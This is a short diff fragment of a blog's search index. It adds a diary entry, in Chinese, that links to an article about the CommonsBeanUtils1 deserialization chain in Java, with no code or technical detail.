+<h2 id="芜风师傅-commonsbeanutils1-反序列化"><a href="#芜风师傅-CommonsBeanUtils1-反序列化" class="headerlink" title="芜风师傅 CommonsBeanUtils1 反序列化"></a>芜风师傅 CommonsBeanUtils1 反序列化</h2><ul>
+<li><p>文章地址：<a href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+</li>
+<li><p>文章中提到了 apache 的 CommonsBeanUtils 包</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>日记</category>
+      </categories>
+      <tags>
+        <tag>日记</tag>
       </tags>
   </entry>
 </search>
